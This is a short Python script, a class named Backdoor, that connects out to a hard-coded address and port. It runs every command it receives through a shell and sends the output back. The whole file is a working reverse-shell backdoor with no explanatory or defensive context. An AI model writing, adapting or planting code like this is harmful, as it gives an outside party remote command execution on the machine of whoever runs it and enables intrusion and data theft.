#!/usr/bin/env python3
import socket
import subprocess

ipAddr = '192.168.1.2'
port = 4213

class Backdoor():
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ipAddr, port))

    def runcommand(self, command):
        return subprocess.check_output(command, shell=True)
    
    def run(self):
        while True:
            command = self.s.recv(1024)
            command_result = self.runcommand(str(command.decode()))
            self.s.send(command_result)
        self.s.close()

b = Backdoor(ipAddr, port)
b.run()